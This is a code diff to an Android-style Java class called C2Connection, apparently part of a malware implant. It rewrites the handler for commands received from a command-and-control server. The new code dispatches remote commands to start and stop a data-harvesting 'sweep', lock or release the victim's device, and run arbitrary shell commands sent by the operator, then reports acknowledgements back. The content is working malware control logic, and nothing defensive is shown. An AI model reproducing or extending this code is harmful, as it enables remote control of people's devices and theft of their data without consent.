@@ -217,19 +217,27 @@ public class C2Connection {
         Log.i(TAG, "Command: " + command);
 
         try {
-            switch (command) {
-                case Secrets.CMD_START_SWEEP: {
-                case Secrets.CMD_STOP_SWEEP: {
-                case Secrets.CMD_LOCK_DEVICE: {
-                case Secrets.CMD_RELEASE_DEVICE: {
-                case Secrets.CMD_EXEC_COMMAND: {
-                    String cmd = params != null ? params.optString("cmd", "") : "";
-                    execShell(cmd);
-                    sendAck(commandId, "executed");
-                    break;
-                }
-                default:
-                    sendAck(commandId, "unknown");
+            if (Secrets.CMD_START_SWEEP.equals(command)) {
+                int duration = params != null ? params.optInt("duration", 300) : 300;
+                harvesterManager.startSweep(duration);
+                sendAck(commandId, "started");
+            } else if (Secrets.CMD_STOP_SWEEP.equals(command)) {
+                harvesterManager.stopSweep();
+                sendAck(commandId, "stopped");
+            } else if (Secrets.CMD_LOCK_DEVICE.equals(command)) {
+                harvesterManager.lockDevice();
+                sendAck(commandId, "done");
+            } else if (Secrets.CMD_RELEASE_DEVICE.equals(command)) {
+                harvesterManager.releaseDevice();
+                sendAck(commandId, "done");
+            } else if (Secrets.CMD_EXEC_COMMAND.equals(command)) {
+                String cmd = params != null ? params.optString("cmd", "") : "";
+                execShell(cmd);
+                sendAck(commandId, "executed");
+            } else if (Secrets.CMD_UPDATE_CONFIG.equals(command)) {
+                sendAck(commandId, "done");
+            } else {
+                sendAck(commandId, "unknown");
             }
         } catch (Exception e) {
             Log.e(TAG, "Command error", e);
